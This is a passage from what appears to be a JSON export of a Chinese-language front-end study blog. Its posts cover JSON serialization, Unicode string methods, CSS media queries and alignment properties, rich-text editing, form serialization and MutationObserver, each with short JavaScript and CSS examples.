[&quot;title&quot;, &quot;edition&quot;]); 如果第二个参数是一个函数，则行为又有不同。提供的函数接收两个参数：属性名（key）和属性值（value）。可以根据这个 key 决定要对相应属性执行什么操作。这个 key 始终是字符串，只是在值不属于某个键/值对时会是空字符串 返回的值就是相应 key 应该包含的结果。注意，返回 undefined 会导致属性被忽略 1234567891011121314151617181920212223242526let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, (key, value) =&gt; &#123;switch(key) &#123;case &quot;authors&quot;:return value.join(&quot;,&quot;)case &quot;year&quot;:return 5000;case &quot;edition&quot;:return undefined;default:return value;&#125;&#125;);/*&#123;&quot;title&quot;:&quot;Professional JavaScript&quot;,&quot;authors&quot;:&quot;Nicholas C. Zakas,MattFrisbie&quot;,&quot;year&quot;:5000&#125;*/ JSON.stringify()方法的第三个参数控制缩进和空格。在这个参数是数值时，表示每一级缩进的空格数。 123456789101112let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [ &quot;Nicholas C. Zakas&quot;, &quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, null, 4); toJSON():在要序列化的对象中添加 toJSON()方法，序列化时会基于这个方法返回适当的 JSON 表示: 12345678910111213let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017,toJSON: function() &#123;//箭头函数不能定义toJSON(),因为剪头函数的词法作用域是全局作用域，在这种情况不合适return this.title;&#125;&#125;;let jsonText = JSON.stringify(book);//book对象返回图书的书名(this.title) toJSON()方法可以与过滤函数一起使用，在把对象传给 JSON.stringify()时会执行如下步骤。 (1) 如果可以获取实际的值，则调用 toJSON()方法获取实际的值，否则使用默认的序列化。(2) 否则，使用默认序列化时，如果提供了第二个参数，则应用过滤。(3) 第(2)步返回的每个值都会相应地进行序列化。(4) 如果提供了第三个参数，则相应地进行缩进。 ES6中堆JSON.stringfy的改造UTF-8 标准规定，0xD800到0xDFFF之间的码点，不能单独使用，必须配对使用。比如，\\uD834\\uDF06是两个码点，但是必须放在一起配对使用，代表字符𝌆。这是为了表示码点大于0xFFFF的字符的一种变通方法。单独使用\\uD834和\\uDFO6这两个码点是不合法的，或者颠倒顺序也不行，因为\\uDF06\\uD834并没有对应的字符。 JSON.stringify()的问题在于，它可能返回0xD800到0xDFFF之间的单个码点。 1JSON.stringify(&#x27;\\u&#123;D834&#125;&#x27;) // &quot;\\u&#123;D834&#125;&quot; 为了确保返回的是合法的 UTF-8 字符，ES2019 改变了JSON.stringify()的行为。如果遇到0xD800到0xDFFF之间的单个码点，或者不存在的配对形式，它会返回转义字符串，留给应用自己决定下一步的处理。 1JSON.stringify(&#x27;\\u&#123;D834&#125;&#x27;) // &quot;&quot;\\\\uD834&quot;&quot;JSON.stringify(&#x27;\\uDF06\\uD834&#x27;) // &quot;&quot;\\\\udf06\\\\ud834&quot;&quot; 解析选项JSON.parse():接收一个参数，这个函数称为还原函数，还原函数接收两个参数，属性名key和属性名value，如果还原函数返回undefined，则结果中删除相应键，如果返回了其他任何值，则该值就会成为相应键的值插入到结果中。 123456789101112131415let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017,releaseDate: new Date(2017, 11, 1)&#125;;let jsonText = JSON.stringify(book);let bookCopy = JSON.parse(jsonText,(key, value) =&gt; key == &quot;releaseDate&quot; ? new Date(value) : value);alert(bookCopy.releaseDate.getFullYear());//对象仙贝序列化为JSON字符串，又被重新解析为一个对象bookCopy,还原函数查找&quot;releaseDate&quot;键，找到后根虎日期字符创建新的Date对象，得到的bookCopy.releaseDate属性又变回Date对象，可以调用其getFullYear()方法","categories":[],"tags":[]},{"title":"字符表示","slug":"字符表示","date":"2022-01-04T03:58:13.000Z","updated":"2022-01-04T04:14:36.508Z","comments":true,"path":"2022/01/04/字符表示/","link":"","permalink":"https://coloey.github.io/2022/01/04/%E5%AD%97%E7%AC%A6%E8%A1%A8%E7%A4%BA/","excerpt":"","text":"JavaScript字符表示JavaScript 字符串由 16 位码元（code unit）组成。对多数字符来说，每 16 位码元对应一个字符。换句话说，字符串的 length 属性表示字符串包含多少 16 位码元 JavaScript 字符串使用了两种 Unicode 编码混合的策略：UCS-2 和 UTF-16。对于可以采用 16 位编码的字符（U+0000~U+FFFF），这两种编码实际上是一样的。 查看指定码元charCodeAt()123456let message = &quot;abcde&quot;;// Unicode &quot;Latin small letter C&quot;的编码是 U+0063console.log(message.charCodeAt(2)); // 99// 十进制 99 等于十六进制 63console.log(99 === 0x63); // true 这个对应关系在扩展到 Unicode 增补字符平面时就不成立了。即 16 位只能唯一表示,65 536 个字符。这对于大多数语言字符集是足够了，在 Unicode 中称为基本多语言平面（BMP）。为了表示更多的字符，Unicode 采用了一个策略，即每个字符使用另外 16 位去选择一个增补平面。这种每个字符使用两个 16 位码元的策略称为代理对。 codePointAt()为正确解析既包含单码元字符又包含代理对字符的字符串，可以使用 codePointAt()来代替charCodeAt()。跟使用 charCodeAt()时类似，codePointAt()接收 16 位码元的索引并返回该索引位置上的码点（code point）。码点是 Unicode 中一个字符的完整标识。比如，”c”的码点是 0x0063，而”☺”的码点是 0x1F60A。码点可能是 16 位，也可能是 32 位，而 codePointAt()方法可以从指定码元位置识别完整的码点。 123456let message = &quot;ab☺de&quot;;console.log(message.codePointAt(1)); // 98console.log(message.codePointAt(2)); // 128522console.log(message.codePointAt(3)); // 56842console.log(message.codePointAt(4)); // 100 给定UTF-16码原创建字符fromCharCode()12345678910111213// Unicode &quot;Latin small letter A&quot;的编码是 U+0061// Unicode &quot;Latin small letter B&quot;的编码是 U+0062// Unicode &quot;Latin small letter C&quot;的编码是 U+0063// Unicode &quot;Latin small letter D&quot;的编码是 U+0064// Unicode &quot;Latin small letter E&quot;的编码是 U+0065console.log(String.fromCharCode(0x61, 0x62, 0x63, 0x64, 0x65)); // &quot;abcde&quot;// 0x0061 === 97// 0x0062 === 98// 0x0063 === 99// 0x0064 === 100// 0x0065 === 101console.log(String.fromCharCode(97, 98, 99, 100, 101)); // &quot;abcde&quot; fromCodePoint()fromCodePoint()：这个方法接收任意数量的码点，返回对应字符拼接起来的字符串 1234console.log(String.fromCharCode(97, 98, 55357, 56842, 100, 101)); // ab☺deconsole.log(String.fromCodePoint(97, 98, 128522, 100, 101)); // ab☺de normalize()规范化Unicode提供了 4种规范化形式，可以将类似上面的字符规范化为一致的格式，无论底层字符的代码是什么。这 4种规范化形式是：NFD（Normalization Form D）、NFC（Normalization Form C）、NFKD（Normalization Form KD）和 NFKC（Normalization Form KC）。可以使用 normalize()方法对字符串应用上述规范化形式，使用时需要传入表示哪种形式的字串：”NFD”、”NFC”、”NFKD”或”NFKC”。 通过比较字符串与其调用 normalize()的返回值，就可以知道该字符串是否已经规范化了 12345678910111213141516171819let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);// U+00C5 是对 0+212B 进行 NFC/NFKC 规范化之后的结果console.log(a1 === a1.normalize(&quot;NFD&quot;)); // falseconsole.log(a1 === a1.normalize(&quot;NFC&quot;)); // trueconsole.log(a1 === a1.normalize(&quot;NFKD&quot;)); // falseconsole.log(a1 === a1.normalize(&quot;NFKC&quot;)); // true// U+212B 是未规范化的console.log(a2 === a2.normalize(&quot;NFD&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFC&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFKD&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFKC&quot;)); // false// U+0041/U+030A 是对 0+212B 进行 NFD/NFKD 规范化之后的结果console.log(a3 === a3.normalize(&quot;NFD&quot;)); // trueconsole.log(a3 === a3.normalize(&quot;NFC&quot;)); // falseconsole.log(a3 === a3.normalize(&quot;NFKD&quot;)); // trueconsole.log(a3 === a3.normalize(&quot;NFKC&quot;)); // false 未规范化： 12345678let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);console.log(a1, a2, a3); // Å, Å, Åconsole.log(a1 === a2); // falseconsole.log(a1 === a3); // falseconsole.log(a2 === a3); // false 选择同一种规范化形式可以让比较操作符返回正确的结果： 1234567let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);console.log(a1.normalize(&quot;NFD&quot;) === a2.normalize(&quot;NFD&quot;)); // trueconsole.log(a2.normalize(&quot;NFKC&quot;) === a3.normalize(&quot;NFKC&quot;)); // trueconsole.log(a1.normalize(&quot;NFC&quot;) === a3.normalize(&quot;NFC&quot;)); // true","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"媒体查询","slug":"媒体查询","date":"2022-01-03T09:42:17.000Z","updated":"2022-01-03T12:40:52.057Z","comments":true,"path":"2022/01/03/媒体查询/","link":"","permalink":"https://coloey.github.io/2022/01/03/%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"媒体查询常被用于以下目的： 有条件的通过 @media 和 @import at-rules 用CSS 装饰样式。 用media= 属性为,,和其他HTML元素指定特定的媒体类型。 语法媒体类型和任意数量的媒体特性表达式构成。 当媒体类型（如果指定）与在其上显示文档的设备匹配并且所有媒体功能表达式都计算为true时，媒体查询将计算为true。 涉及未知媒体类型的查询始终为false。 媒体类型描述设备的一般类别。除非使用 not 或 only 逻辑操作符，媒体类型是可选的，并且会（隐式地）应用 all 类型。 1all 适用于所有设备。 1print 适用于在打印预览模式下在屏幕上查看的分页材料和文档。 （有关特定于这些格式的格式问题的信息，请参阅分页媒体。） 1screen 主要用于屏幕。 1speech 主要用于语音合成器。 定位媒体类型12@media screen, print &#123; ... &#125;/*用两个媒体查询来同时定位屏幕和打印设备*/ 媒体特性描述了 user agent、输出设备，或是浏览环境的具体特征。媒体特性表达式是完全可选的，它负责测试这些特性或特征是否存在、值为多少。每条媒体特性表达式都必须用括号括起来。 逻辑操作符 not, and, 和 only 可用于联合构造复杂的媒体查询，您还可以通过用逗号分隔多个媒体查询，将它们组合为一个规则。 and and 操作符用于将多个媒体查询规则组合成单条媒体查询，当每个查询规则都为真时则该条媒体查询为真，它还用于将媒体功能与媒体类型结合在一起。 notnot运算符用于否定媒体查询，如果不满足这个条件则返回true，否则返回false。 如果出现在以逗号分隔的查询列表中，它将仅否定应用了该查询的特定查询。 如果使用not运算符，则还必须指定媒体类型。 注意：在Level 3中，not关键字不能用于否定单个媒体功能表达式，而只能用于否定整个媒体查询。 onlyonly运算符仅在整个查询匹配时才用于应用样式，并且对于防止较早的浏览器应用所选样式很有用。 当不使用only时，旧版本的浏览器会将screen and (max-width: 500px)简单地解释为screen，忽略查询的其余部分，并将其样式应用于所有屏幕。 如果使用only运算符，则还必须指定媒体类型。 , (逗号)逗号用于将多个媒体查询合并为一个规则。 逗号分隔列表中的每个查询都与其他查询分开处理。 因此，如果列表中的任何查询为true，则整个media语句均返回true。 换句话说，列表的行为类似于逻辑或or运算符。 定位媒体特性1234567/*当用户的主要输入机制（例如鼠标）可以悬停在元素上*/@media (hover: hover) &#123; ... &#125;@media (max-width: 12450px) &#123; ... &#125;/*CSS将适用于任何带有彩色屏幕的设备*/@media (color) &#123; ... &#125;/*限制为带有屏幕的设备,宽度至少为30 em的横向的设备*/@media screen and (min-width: 30em) and (orientation: landscape) &#123; ... &#125;","categories":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"toggle","slug":"toggle","date":"2022-01-03T01:47:27.000Z","updated":"2022-01-03T12:40:32.389Z","comments":true,"path":"2022/01/03/toggle/","link":"","permalink":"https://coloey.github.io/2022/01/03/toggle/","excerpt":"","text":"DOMTokenList.toggle()DOMTokenList接口的toggle()方法从列表中删除一个给定的标记并返回false,如果标记不存在，则添加并且函数返回true tokenList.toggle(token,force); 参数：token:标记列表中你想探查并切换的DOMSring force(可选):Boolean值，设置后会将方法变成单向操作，如果设置为false，则会删除标记列表中匹配的给定标记，且不会再添加，如设置为true，则将在标记中添加给定标记，且不会再度删除 返回值：为布尔值 egHTML 1&lt;span class=&quot;a b&quot;&gt;classList is &#x27;a b&#x27;&lt;/span&gt; JavaScript 12345678910var span = document.querySelector(&quot;span&quot;);var classes = span.classList;span.onclick = function() &#123; var result = classes.toggle(&quot;c&quot;); if(result) &#123; span.textContent = &quot;&#x27;c&#x27; added; classList is now &#x27;&quot; + classes + &quot;&#x27;.&quot;; &#125; else &#123; span.textContent = &quot;&#x27;c&#x27; removed; classList is now &#x27;&quot; + classes + &quot;&#x27;.&quot;; &#125;&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"align-self,align-item,align-content","slug":"对齐方式对比","date":"2022-01-03T01:42:03.000Z","updated":"2022-01-03T12:40:14.249Z","comments":true,"path":"2022/01/03/对齐方式对比/","link":"","permalink":"https://coloey.github.io/2022/01/03/%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94/","excerpt":"","text":"align-selfCSS属性 align-self 会对齐当前 grid 或 flex 行中的元素，并覆盖已有的 align-items 的值。In Grid, it aligns the item inside the grid area. 在 Flexbox 中，会按照 cross axis（当前 flex 元素排列方向的垂直方向）进行排列。 值auto:设置为父元素的 align-items 值。 normal: 效果取决于当前的布局模式: 绝对定位布局中，normal在绝对定位的替代元素上表现为start，在所有其他绝对定位元素上表现为stretch。 在绝对定位的静态元素上表现为stretch。 flex布局中表现为stretch。 在网格布局中表现为stretch,除了有部分比例或者一个固定大小的盒子的效果像start。 在块级和表格单元中无效。 flex-start:对齐到cross-axis的首端 flex-end:对齐到cross-axis的尾端 center:对齐到cross-axis的中间，如果该元素的 cross-size 尺寸大于 flex 容器，将在两个方向均等溢出。 safe:如果元素大小溢出对齐的容器，则将元素改为对齐，就像start unsafe:无论元素和对齐容器的相对大小如何都遵循给定的对齐值 egHTML 1234567891011&lt;section&gt; &lt;div&gt; Item#1 &lt;/div&gt; &lt;div&gt; Item#2 &lt;/div&gt; &lt;div&gt; Item#3 &lt;/div&gt;&lt;/section&gt; CSS 1234567891011121314151617section &#123; display: flex; align-items: center; height: 120px; background: beige;&#125;div &#123; height: 60px; background: cyan; margin: 5px;&#125;div:nth-child(3) &#123; align-self: flex-end; background: pink;&#125; align-itemsCSS align-items属性将所有直接子节点上的align-self值设置为一个组。 目前，Flexbox和CSS网格布局支持此属性。在Flexbox中，它控制十字轴上项目的对齐方式，在网格布局中，它控制块轴上项目的对齐方式。 align-contentalign-content 属性设置了浏览器如何沿着弹性盒子布局的纵轴和网格布局的主轴在内容项之间和周围分配空间。 123456789101112131415161718192021222324252627282930313233343536/* 基本位置对齐 *//*align-content不采用左右值 */align-content: center; /* 将项目放置在中点 */align-content: start; /* 最先放置项目 */align-content: end; /* 最后放置项目 */align-content: flex-start; /* 从起始点开始放置flex元素 */align-content: flex-end; /* 从终止点开始放置flex元素 *//* 默认对齐 */align-content: normal;/*基线对齐*/align-content: baseline;align-content: first baseline;align-content: last baseline;/* 分布式对齐 */align-content: space-between; /* 均匀分布项目 第一项与起始点齐平， 最后一项与终止点齐平 */align-content: space-around; /* 均匀分布项目 项目在两端有一半大小的空间*/align-content: space-evenly; /* 均匀分布项目 项目周围有相等的空间 */align-content: stretch; /* 均匀分布项目 拉伸‘自动’-大小的项目以充满容器 *//* 溢出对齐 */align-content: safe center;align-content: unsafe center;/* 全局属性 */align-content: inherit; /* 继承 */align-content: initial; /* 初始值 */align-content: unset; /* 未设置 */ justify-itemsjustify-items 属性为所有盒中的项目定义了默认的 justify-self ， 可以使这些项目以默认方式沿适当轴线对齐到每个盒子。 justify-contentjustify-content 属性定义了浏览器之间，如何分配顺着弹性容器主轴(或者网格行轴) 的元素之间及其周围的空间。 1234567891011121314151617181920212223242526272829303132/* Positional alignment */justify-content: center; /* 居中排列 */justify-content: start; /* Pack items from the start */justify-content: end; /* Pack items from the end */justify-content: flex-start; /* 从行首起始位置开始排列 */justify-content: flex-end; /* 从行尾位置开始排列 */justify-content: left; /* Pack items from the left */justify-content: right; /* Pack items from the right *//* Baseline alignment */justify-content: baseline;justify-content: first baseline;justify-content: last baseline;/* Distributed alignment */justify-content: space-between; /* 均匀排列每个元素 首个元素放置于起点，末尾元素放置于终点 */justify-content: space-around; /* 均匀排列每个元素 每个元素周围分配相同的空间 */justify-content: space-evenly; /* 均匀排列每个元素 每个元素之间的间隔相等 */justify-content: stretch; /* 均匀排列每个元素 &#x27;auto&#x27;-sized 的元素会被拉伸以适应容器的大小 *//* Overflow alignment */justify-content: safe center;justify-content: unsafe center;/* Global values */justify-content: inherit;justify-content: initial;justify-content: unset; justify-self[justify-self 在 Flexbox布局中失效]在主轴上，Flexbox将我们的内容作为一个组进行处理。 计算布置子元素所需的空间量，然后剩余空间可用于分配。 justify-content属性控制剩余空间的使用方式。 设置justify-content：flex-end，额外空间放在所有子元素之前，justify-content：space-around，它放在该维度的子元素的两侧，等等。 这意味着在Flexbox中，justify-self属性没有意义，因为我们总是处理移动整个元素组。 在十字轴上，align-self是有意义的，因为我们可能在该维度中的flex容器中有额外的空间，其中单个元素可以移动到开始和结束位置。","categories":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"富文本","slug":"富文本","date":"2021-12-13T11:59:24.000Z","updated":"2021-12-30T07:18:06.906Z","comments":true,"path":"2021/12/13/富文本/","link":"","permalink":"https://coloey.github.io/2021/12/13/%E5%AF%8C%E6%96%87%E6%9C%AC/","excerpt":"","text":"富文本编辑在空白 HTML 文件中嵌入一个iframe。通过 designMode 属性，可以将这个空白文档变成可以编辑的，实际编辑的则是元素的 HTML。designMode 属性有两个可能的值：”off”（默认值）和”on”。设置为”on”时 富文本交互使用 document.execCommand()。这个方法在文档上执行既定的命令，可以实现大多数格式化任务。document.execCommand()可以接收 3 个参数：要执行的命令、表示浏览器是否为命令提供用户界面的布尔值和执行命令必需的值 12345678910// 在内嵌窗格中切换粗体文本样式frames[&quot;richedit&quot;].document.execCommand(&quot;bold&quot;, false, null);// 在内嵌窗格中切换斜体文本样式frames[&quot;richedit&quot;].document.execCommand(&quot;italic&quot;, false, null);// 在内嵌窗格中创建指向 www.wrox.com 的链接frames[&quot;richedit&quot;].document.execCommand(&quot;createlink&quot;, false,&quot;http://www.wrox.com&quot;);// 在内嵌窗格中为内容添加&lt;h1&gt;标签frames[&quot;richedit&quot;].document.execCommand(&quot;formatblock&quot;, false, &quot;&lt;h1&gt;&quot;); 富文本选择在内嵌窗格中使用 getSelection()方法，可以获得富文本编辑器的选区。这个方法暴露在document 和 window 对象上，返回表示当前选中文本的 Selection 对象 12345678910let selection = frames[&quot;richedit&quot;].getSelection();// 取得选中的文本let selectedText = selection.toString();// 取得表示选区的范围let range = selection.getRangeAt(0);// 高亮选中的文本let span = frames[&quot;richedit&quot;].document.createElement(&quot;span&quot;);span.style.backgroundColor = &quot;yellow&quot;;range.surroundContents(span); 通过表单提交富文本12345form.addEventListener(&quot;submit&quot;,(event)=&gt;&#123; let target=event.target; target.elements[&quot;comments&quot;].value=frames[&quot;richedit&quot;].document.body.innerHTML;//使用内嵌窗格 //target.elements[&quot;comments&quot;].value=document.getElementById(&quot;richedit&quot;).innerHTML;//使用contenteditable&#125;)","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"表单序列化","slug":"表单序列化","date":"2021-12-12T11:09:55.000Z","updated":"2021-12-30T07:17:55.272Z","comments":true,"path":"2021/12/12/表单序列化/","link":"","permalink":"https://coloey.github.io/2021/12/12/%E8%A1%A8%E5%8D%95%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"表单在js中可以使用表单字段的type属性连同其name属性和value属性来进行序列化 字段名和值是 URL 编码的并以和号（&amp;）分隔。 禁用字段不会发送。 复选框或单选按钮只在被选中时才发送。 类型为”reset”或”button”的按钮不会发送。 多选字段的每个选中项都有一个值。 通过点击提交按钮提交表单时，会发送该提交按钮；否则，不会发送提交按钮。类型为”image”的元素视同提交按钮。 select元素的值是被选中option元素的 value 属性。如果元素没有 value 属性，则该值是它的文本 返回的结果是查询字符串的格式 1234567891011121314151617181920212223242526272829303132333435363738394041function serialize(form)&#123; let parts=[]; let optValue; for(let field of form.elements)&#123; switch(field.type)&#123; case &quot;select-one&quot;: case &quot;select-multiple&quot;: if(field.name.length)&#123; for(let option of field.options)&#123; if(option.selected)&#123; if(option.hasAttribute)&#123; optValue=(option.hasAttribute(&quot;value&quot;)?option.value:option.text); &#125;else&#123; optValue=(option.attributes[&quot;value&quot;].specified?option.value:option.text); &#125; parts.push(`$&#123;encodeURIComponent(field.name)&#125;=`+`$&#123;encodeURIComponent(optValue)&#125;`); &#125; &#125; &#125; break; case undefined://字段集 case &quot;file&quot;://文件输入 case &quot;submit&quot;://提交按钮 case &quot;reset&quot;://重置按钮 case &quot;button&quot;://自定义按钮 break; case &quot;radio&quot;://单选按钮 case &quot;checkbox&quot;://复选框 if(!field.checked)&#123;//没被选中，跳出switch，否则进入default分支，将字段的名字和值编码后添加进parts数组 break; &#125; default: //不包含没有名字的表单字段 if(field.name.length)&#123; parts.push(`$&#123;encodeURIComponent(field.name)&#125;=`+`$&#123;encodeURIComponent(field.value)&#125;`) &#125; &#125; &#125; return parts.join(&quot;&amp;&quot;);&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"DOM编程","slug":"DOM-DOM编程","date":"2021-12-12T09:15:15.000Z","updated":"2022-01-24T08:12:45.132Z","comments":true,"path":"2021/12/12/DOM-DOM编程/","link":"","permalink":"https://coloey.github.io/2021/12/12/DOM-DOM%E7%BC%96%E7%A8%8B/","excerpt":"","text":"DOM编程动态脚本1234567891011function loadScriptString(code)&#123; var script=document.createElement(&quot;script&quot;); script.type=&quot;text/javascript&quot;; try&#123; script.appendChild(document.createTextNode(code));//旧版本的IE浏览器可能出问题 &#125;catch(ex)&#123; script.text=code; &#125; document.body.appendChild(script);&#125;loadScriptString(&quot;function sayHi()&#123;alert(&#x27;hi&#x27;);&#125;&quot;); 动态样式123456789101112function loadStyleString(css)&#123; let style=document.createElement(&quot;style&quot;); style.type=&quot;text/css&quot;; try&#123; style.appendChild(document.createTextNode(css)); &#125;catch(ex)&#123; style.styleSheet.cssText=css; &#125; let head=document.getElementsByTagName(&quot;head&quot;)[0]; head.appendChild(style);&#125;loadStyleString(&quot;body[background-color:red&#125;&quot;); 对于IE，要小心使用styleSheet.cssText，如果重用同一个style元素并设置该属性超过一次，则可能导致浏览器崩溃，将cssText设置为空字符串也可能导致浏览器崩溃 表单12345678910111213141516171819let table=document.createElement(&quot;table&quot;);table.border=1;table.width=&quot;100%&quot;;let tbody=document.createElement(&quot;tbody&quot;);table.appendChild(tbody);table.insertRow(0);tbody.rows[0].insertCell(0);tbody.rows[0].cells[0].appendChild(document.createTextNode(&quot;Cell 1,1&quot;));tbody.rows[0].insertCell(1);tbody.rows[0].cells[1].appendChild(document.createTextNode(&quot;Cell 2,1&quot;));table.insertRow(1);tbody.rows[1].insertCell(0);tbody.rows[1].cells[0].appendChild(document.createTextNode(&quot;Cell 1,2&quot;));tbody.rows[1].insertCell(1);tbody.rows[1].cells[1].appendChild(document.createTextNode(&quot;Cell 2,2&quot;));document.body.appendChild(table); NodeList12345let divs=document.getElementsByTagName(&quot;div&quot;);for(let i=0,len=divs.length;i&lt;len;i++)&#123; let div=doocument.createElement(&quot;div&quot;); document.body.appendChild(div);&#125;//避免导致无穷循环 Mutationobserver接口在DOM被修改时异步执行回调，使用MutationObserver可以观察整个文档，DOM树的一部分或某个元素 MutationObserver的实例通过调用MutationObserver构造函数并传入一个回调函数创建 1let observer=new MutationObserver(()=&gt;console.log(&#x27;DOM was mutated&#x27;)); observe()方法接收两个参数：要观察其变化的DOM节点，以及一个MutationObserverInit对象（用于控制观察哪些方面的变化，是一个键值对形式配置选项的字典） 12let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt; attributes changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;); body元素上任何属性发生变化都会被这个MutationObserver实例发现，然后异步执行注册的回调函数,body元素后代修改或其他非属性修改不会触发回调进入任务 123456let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt; attributes changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;console.log(&#x27;Changed body class&#x27;);//Changed body class//&lt;body&gt; attributes changed 回调与MutationRecord每次回调都会收到一个MutationRecord实例的数组,包含的信息发生了什么变化以及DOM哪一部分受到影响 123456789let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));[observer.observe(document.body,&#123;attributes:true&#125;);document.body.setAttributeNS(&#x27;foo&#x27;,&#x27;bar&#x27;,&#x27;baz&#x27;);//连续修改多个MutationRecord实例，回调函数就会受到包含这些实例的数组，顺序为变化事件的顺序let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;document.body.className=&#x27;bar&#x27;;//[MutationRecord, MutationRecord] disconnect()方法会停止此后变化事件的回调，也会抛弃已经加入任务队列要异步执行的回调 1234567891011let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt;attributes changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;observer.disconnect();document.body.className=&#x27;bar&#x27;;//无日志输出//让已经入队的回调函数执行完毕后再调用disconnect()setTimeout(()=&gt;&#123; observer.disconnect(); document.body.className=&#x27;bar&#x27;;&#125;,0); 复用MutationObserver12345678910let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.target)));let childA=document.createElement(&#x27;div&#x27;); childB=document.createElement(&#x27;span&#x27;);document.body.appendChild(childA);document.body.appendChild(childB);observer.observe(childA,&#123;attributes:true&#125;);observer.observe(childB,&#123;attributes:true&#125;);childA.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);childB.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//[div, span] 重用MutationObserver调用diaconnect()不会结束MutationObserver的生命，还可以重新使用这个观察者，再将它关联到新的目标结点 MutationObserverInit与观察范围观察属性设置attributes为true,观察所有属性 123456789let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);//添加属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//修改属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;);//移除属性document.body.removeAttribute(&#x27;foo&#x27;); 用attributeFilter添加白名单属性 123456let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributeFilter:[&#x27;foo&#x27;]&#125;);//添加白名单属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//添加被排除的属性document.body.setAttribute(&#x27;baz&#x27;,&#x27;qux&#x27;); 在记录中保存属性原来的值 123456let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.oldValue)));observer.observe(document.body,&#123;attributeOldValue:true&#125;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;qux&#x27;);//[null, &#x27;bar&#x27;, &#x27;baz&#x27;] 观察字符数据12345678910111213let observer=new MutationObserver(document.body.firstChild,&#123;characterData:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;//创建要观察的文本节点observer.observe(document.body.firstChild,&#123;characterData:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;document.body.firstChild.textContent=&#x27;bar&#x27;;document.body.firstChild.textContent=&#x27;baz&#x27;;//使用characterDataOldValuelet observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.oldValue)));document.body.firstChild.textContent=&#x27;foo&#x27;;//创建要观察的文本节点observer.observe(document.body.firstChild,&#123;characterDataOldValue:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;document.body.firstChild.textContent=&#x27;bar&#x27;;document.body.firstChild.textContent=&#x27;baz&#x27;; 观察子节点12345678document.body.innerHTML=&#x27;&#x27;;let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));//创建两个初始子节点document.body.appendChild(document.createElement(&#x27;div&#x27;));document.body.appendChild(document.createElement(&#x27;span&#x27;));observer.observe(document.body,&#123;childList:true&#125;);document.body.insertBefore(document.body.lastChild,document.body.firstChild);//发生两次变化，先移除节点再添加节点 观察子树12345document.body.innerHTML=&#x27;&#x27;;let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));document.body.appendChild(document.createElement(&#x27;div&#x27;));observer.observe(document.body,&#123;attributes:true,subtree:true&#125;);document.body.firstChild.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;); 异步回调与记录队列takeRecords()方法清空记录队列，取出并·返回其中的所有MutationRecord实例,可以用在希望断开与观察目标的联系，但又希望处理由于disconnect()而被抛弃的记录队列中的MutationRecord实例 12345678let observer=new 